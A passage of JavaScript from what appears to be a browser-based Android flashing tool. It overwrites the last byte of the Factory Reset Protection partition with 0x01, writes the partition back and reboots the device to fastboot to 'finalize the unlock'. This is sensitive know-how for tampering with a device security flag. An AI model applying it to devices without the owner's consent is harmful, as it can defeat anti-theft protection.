      modified = true;
      report(onProgress, "FRP", `→ Was 0x${lastByte.toString(16)}, forced to 0x01`, 0.80);
    }

    // ── Stage 10: Write FRP ──
    if (modified) {
      report(onProgress, "FRP", "Writing modified FRP...", 0.83);
      await xf.writePartition(frpAddr, frpData, 1, 8);
      report(onProgress, "FRP", "FRP written ✓", 0.88);
    }

    // ── Stage 11: Reboot to Fastboot ──
    report(onProgress, "Reboot", "Rebooting to fastboot...", 0.92);
    await xf.shutdown(2);
    report(onProgress, "Reboot", "Shutdown sent ✓", 0.95);

    await transport.close();
    transport = null;

    report(onProgress, "Done",
      "Device rebooting to fastboot! Click CONNECT_BOOTLOADER above, then FLASH_STOCK_OS to finalize the unlock.",
      1.0);

    return { success: true, frpModified: modified, rebootedToFastboot: true };

  } catch (err) {
    if (transport) await transport.close().catch(() => {});
    throw err;
  }
}
